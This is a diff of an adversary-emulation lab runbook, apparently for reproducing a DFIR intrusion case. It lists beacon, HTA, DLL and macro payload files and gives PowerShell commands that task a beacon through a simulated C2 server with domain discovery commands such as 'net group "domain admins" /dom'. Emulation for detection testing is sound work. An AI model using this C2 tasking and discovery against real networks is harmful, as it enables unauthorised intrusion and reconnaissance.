@@ -26,7 +26,7 @@ credentials only via prompt/runas — never on a command line or in logs.
 | Session-1 chain (S1–S3 re-run) | `payloads/hta/bootstrap.hta`, `payloads/beacon/c0015_beacon.ps1`, `payloads/dll/c0015_bootstrap_dll.c`, `payloads/docm/macro_payload.vba` | `payloads/packaging/build_dll.sh` → `build/out/c0015-comparefor.jpg`; `make_config.ps1` (full task map) |
 | **143.dll surrogate (S8/S9)** — NEW | `payloads/dll/c0015_143_surrogate.c` | `x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi` (on Kali) |
 | phase7 config (FS01) | `payloads/config/c0015-phase7.example.ini` → fill `run_id` | staged to `C:\C0015\config-phase7.ini` in S8a |
-| C2-SIM | `scripts/c2sim_v2.py` (phase3 batch + phase7-session2 receipt) | `python scripts/c2sim_v2.py --ip 192.168.50.1 --port 8080 --ledger evidence/run-ledger --log c2sim.log` |
+| C2-SIM v3 | `scripts/c2sim_v2.py` — dynamic tasking via `POST /cmd` (operator benign commands; queue priority) + phase3 batch + phase7-session2 receipt | `python scripts/c2sim_v2.py --ip 192.168.50.1 --port 8080 --ledger evidence/run-ledger --log c2sim.log` |
 
 **Run identity:** use ONE new `run_id` (RUN-YYYYMMDD-NN) for this pass so S1→S9 share it (E2E continuity).
 Phase-1's session-1 beacon is closed — **re-establish session 1 under the new run_id first (Step 1)**.
@@ -53,10 +53,24 @@ powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .
 Verify: `c2sim.log` shows `register stage=phase3 host=WS01 ok=True (registered)` (ONE, dedup otherwise);
 markers `b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`, `dll-executed.txt`.
 
-## 2. S4 — full discovery batch (WS01, parent = beacon session-1 PID)
+## 2. S4 — operator-driven discovery (WS01, parent = beacon session-1 PID)
 
-The C2-SIM serves the DFIR batch once in order (CORPUS, SYSTEM, DOMAINGROUPS, LOCALGROUPS, TRUSTS, NETVIEWALL,
-TIME, PING), then idles on T-BEACON-SLEEP. Lift `loop_count` if the beacon exits before 8 rounds.
+C2-SIM v3 lets the operator **drive the beacon like a real C2 operator**: enqueue any benign command via
+`POST /cmd` (the queue takes priority), or let the fixed DFIR batch run. Default batch order: CORPUS, SYSTEM,
+DOMAINGROUPS, LOCALGROUPS, TRUSTS, NETVIEWALL, TIME, PING, then T-BEACON-SLEEP idle.
+
+Operator console (C2 host; token from the `c2sim.log` register line):
+```powershell
+$tok = "S1-…"; $c2 = "http://192.168.50.1:8080"
+# task a single benign command — the beacon runs it on WS01 (parent chain preserved)
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net view /all"
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "tasklist /s localhost"
+# micro-manage the burst like the DFIR operator; typo/copy-paste variation is itself a
+# runbook signature (seen in the source), so vary the command strings on purpose
+Invoke-RestMethod -Method Post -Uri "$c2/cmd?session=$tok" -Body "net group `"domain admins`" /dom"
+```
+Results appear as `result ... task=OP-CMD ...` in `c2sim.log`; the beacon sleeps
+`loop_sleep_sec ± loop_sleep_jitter_sec` between rounds (v3 cadence). Raise `loop_count` while shepherding.
 
 Verify (C2 host + Elastic):
 ```powershell
